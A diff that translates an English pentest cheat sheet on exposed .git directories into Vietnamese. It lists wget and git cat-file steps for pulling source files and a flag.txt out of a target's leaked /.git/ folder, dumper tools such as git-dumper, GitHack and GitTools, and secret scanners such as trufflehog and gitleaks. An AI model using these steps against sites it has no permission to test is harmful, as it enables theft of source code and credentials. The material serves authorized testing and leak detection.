@@ -1,40 +1,45 @@
 # Git
 
-## Summary
+## Tóm tắt
 
-* [Methodology](#methodology)
-    * [Recovering file contents from .git/logs/HEAD](#recovering-file-contents-from-gitlogshead)
-    * [Recovering file contents from .git/index](#recovering-file-contents-from-gitindex)
-* [Tools](#tools)
-    * [Automatic recovery](#automatic-recovery)
-        * [git-dumper.py](#git-dumperpy)
-        * [diggit.py](#diggitpy)
-        * [GoGitDumper](#gogitdumper)
-        * [rip-git](#rip-git)
-        * [GitHack](#githack)
-        * [GitTools](#gittools)
-    * [Harvesting secrets](#harvesting-secrets)
-        * [noseyparker](#noseyparker)
-        * [trufflehog](#trufflehog)
-        * [Yar](#yar)
-        * [Gitrob](#gitrob)
-        * [Gitleaks](#gitleaks)
-* [References](#references)
+* [Phương pháp](#methodology)
 
-## Methodology
+  * [Khôi phục nội dung file từ .git/logs/HEAD](#recovering-file-contents-from-gitlogshead)
+  * [Khôi phục nội dung file từ .git/index](#recovering-file-contents-from-gitindex)
+* [Công cụ](#tools)
 
-The following examples will create either a copy of the .git or a copy of the current commit.
+  * [Khôi phục tự động](#automatic-recovery)
 
-Check for the following files, if they exist you can extract the .git folder.
+    * [git-dumper.py](#git-dumperpy)
+    * [diggit.py](#diggitpy)
+    * [GoGitDumper](#gogitdumper)
+    * [rip-git](#rip-git)
+    * [GitHack](#githack)
+    * [GitTools](#gittools)
+  * [Thu thập secrets](#harvesting-secrets)
+
+    * [noseyparker](#noseyparker)
+    * [trufflehog](#trufflehog)
+    * [Yar](#yar)
+    * [Gitrob](#gitrob)
+    * [Gitleaks](#gitleaks)
+* [Tài liệu tham khảo](#references)
+
+## Phương pháp
+
+Các ví dụ dưới đây sẽ tạo một bản sao của `.git` hoặc một bản sao của commit hiện tại.
+
+Kiểm tra các file sau; nếu chúng tồn tại, bạn có thể trích xuất thư mục `.git`.
 
 * `.git/config`
 * `.git/HEAD`
 * `.git/logs/HEAD`
 
-### Recovering file contents from .git/logs/HEAD
+### Khôi phục nội dung file từ .git/logs/HEAD
 
-* Check for 403 Forbidden or directory listing to find the `/.git/` directory
-* Git saves all information in `.git/logs/HEAD` (try lowercase `head` too)
+* Kiểm tra `403 Forbidden` hoặc directory listing để tìm thư mục `/.git/`
+
+* Git lưu toàn bộ thông tin trong `.git/logs/HEAD` (thử cả chữ thường `head`)
 
   ```powershell
   0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
@@ -43,21 +48,21 @@ Check for the following files, if they exist you can extract the .git folder.
   6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
   ```
 
-* Access the commit using the hash
+* Truy cập commit bằng hash
 
   ```powershell
-  # create an empty .git repository
+  # tạo một repository .git rỗng
   git init test
   cd test/.git
 
-  # download the file
+  # tải file xuống
   wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
 
-  # first byte for subdirectory, remaining bytes for filename
+  # byte đầu tiên cho thư mục con, các byte còn lại cho tên file
   mkdir .git/object/26
   mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
 
-  # display the file
+  # hiển thị file
   git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
       tree 323240a3983045cdc0dec2e88c1358e7998f2e39
       parent 15ca375e54f056a576905b41a417b413c57df6eb
@@ -66,22 +71,22 @@ Check for the following files, if they exist you can extract the .git folder.
       Initial.
   ```
 
-* Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39
+* Truy cập tree `323240a3983045cdc0dec2e88c1358e7998f2e39`
 
-    ```powershell
-    wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
-    mkdir .git/object/32
-    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
+  ```powershell
+  wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
+  mkdir .git/object/32
+  mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
 
-    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
-        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
-        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
-        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
-        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
-        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
-    ```
+  git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
+      040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
+      100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
+      040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
+      100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
+      040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
+  ```
 
-* Read the data (flag.txt)
+* Đọc dữ liệu (`flag.txt`)
 
   ```powershell
   wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
@@ -90,16 +95,16 @@ Check for the following files, if they exist you can extract the .git folder.
   git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
   ```
 
-### Recovering file contents from .git/index
+### Khôi phục nội dung file từ .git/index
 
-Use the git index file parser <https://pypi.python.org/pypi/gin> (python3).
+Sử dụng Git index file parser https://pypi.python.org/pypi/gin (python3).
 
 ```powershell
 pip3 install gin
 gin ~/git-repo/.git/index
 ```
 
-Recover name and sha1 hash of every file listed in the index, and use the same process above to recover the file.
+Khôi phục tên và hash SHA-1 của mọi file được liệt kê trong index, sau đó sử dụng quy trình tương tự ở trên để khôi phục file.
 
 ```powershell
 $ gin .git/index | egrep -e "name|sha1"
@@ -110,13 +115,13 @@ name = CRLF injection/README.md
 sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 ```
 
-## Tools
+## Công cụ
 
-### Automatic recovery
+### Khôi phục tự động
 
 #### git-dumper.py
 
-* [arthaud/git-dumper](https://github.com/arthaud/git-dumper)
+* https://github.com/arthaud/git-dumper
 
 ```powershell
 pip install -r requirements.txt
@@ -132,13 +137,13 @@ pip install -r requirements.txt
 ./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
 ```
 
-`-u` is remote path, where .git folder exists  
-`-t` is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (`cd /path/to/temp/folder && git init`)  
-`-o` is a hash of particular Git object to download
+`-u` là đường dẫn từ xa, nơi tồn tại thư mục `.git`
+`-t` là đường dẫn đến thư mục cục bộ chứa Git repository giả và nơi nội dung blob (các file) được lưu với tên thật của chúng (`cd /path/to/temp/folder && git init`)
+`-o` là hash của Git object cụ thể cần tải xuống
 
 #### GoGitDumper
 
-* [c-sto/gogitdumper](https://github.com/c-sto/gogitdumper)
+* https://github.com/c-sto/gogitdumper
 
 ```powershell
 go get github.com/c-sto/gogitdumper
@@ -149,7 +154,7 @@ git checkout
 
 #### rip-git
 
-* [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)
+* https://github.com/kost/dvcs-ripper
 
 ```powershell
 perl rip-git.pl -v -u "http://web.site/.git/"
@@ -165,7 +170,7 @@ git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 
 #### GitHack
 
-* [lijiejie/GitHack](https://github.com/lijiejie/GitHack)
+* https://github.com/lijiejie/GitHack
 
 ```powershell
 GitHack.py http://web.site/.git/
@@ -173,18 +178,18 @@ GitHack.py http://web.site/.git/
 
 #### GitTools
 
-* [internetwache/GitTools](https://github.com/internetwache/GitTools)
+* https://github.com/internetwache/GitTools
 
 ```powershell
 ./gitdumper.sh http://target.tld/.git/ /tmp/destdir
 git checkout -- .
 ```
 
-### Harvesting secrets
+### Thu thập secrets
 
 #### noseyparker
 
-> [praetorian-inc/noseyparker](https://github.com/praetorian-inc/noseyparker) - Nosey Parker is a command-line tool that finds secrets and sensitive information in textual data and Git history.
+> https://github.com/praetorian-inc/noseyparker - Nosey Parker là một công cụ dòng lệnh giúp tìm kiếm secrets và thông tin nhạy cảm trong dữ liệu dạng văn bản và lịch sử Git.
 
 ```ps1
 git clone https://github.com/trufflesecurity/test_keys
@@ -196,7 +201,7 @@ noseyparker scan --datastore np.noseyparker --github-user octocat
 
 #### trufflehog
 
-> Searches through git repositories for high entropy strings and secrets, digging deep into commit history.
+> Tìm kiếm các chuỗi có entropy cao và secrets trong Git repository, đào sâu vào lịch sử commit.
 
 ```powershell
 pip install truffleHog
@@ -205,7 +210,7 @@ truffleHog --regex --entropy=False https://github.com/trufflesecurity/trufflehog
 
 #### Yar
 
-> Searches through users/organizations git repositories for secrets either by regex, entropy or both. Inspired by the infamous truffleHog.
+> Tìm kiếm secrets trong repository Git của user/organization bằng regex, entropy hoặc cả hai. Lấy cảm hứng từ truffleHog nổi tiếng.
 
 ```powershell
 go get github.com/nielsing/yar # https://github.com/nielsing/yar
@@ -214,7 +219,7 @@ yar -o orgname --both
 
 #### Gitrob
 
-> Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.
+> Gitrob là một công cụ giúp tìm các file có khả năng chứa thông tin nhạy cảm được push lên các repository public trên Github. Gitrob sẽ clone các repository thuộc về một user hoặc organization xuống độ sâu có thể cấu hình, duyệt qua lịch sử commit và đánh dấu các file khớp với signature của những file có khả năng chứa thông tin nhạy cảm.
 
 ```powershell
 go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
@@ -224,26 +229,26 @@ gitrob [options] target [target2] ... [targetN]
 
 #### Gitleaks
 
-> Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.
+> Gitleaks cung cấp một phương thức để tìm các secrets chưa được mã hóa và những loại dữ liệu không mong muốn khác trong các Git source code repository.
 
-* Run gitleaks against a public repository
+* Chạy gitleaks trên một public repository
 
-    ```powershell
-    docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git
-    ```
+  ```powershell
+  docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git
+  ```
 
-* Run gitleaks against a local repository already cloned into /tmp/
+* Chạy gitleaks trên một repository cục bộ đã được clone vào `/tmp/`
 
-    ```powershell
-    docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks
-    ```
+  ```powershell
+  docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks
+  ```
 
-* Run gitleaks against a specific Github Pull request
+* Chạy gitleaks trên một GitHub Pull Request cụ thể
 
-    ```powershell
-    docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000
-    ```
+  ```powershell
+  docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000
+  ```
 
-## References
+## Tài liệu tham khảo
 
 * [Gitrob: Now in Go - Michael Henriksen - January 24, 2024](https://web.archive.org/web/20240930092732/https://michenriksen.com/blog/gitrob-now-in-go/)
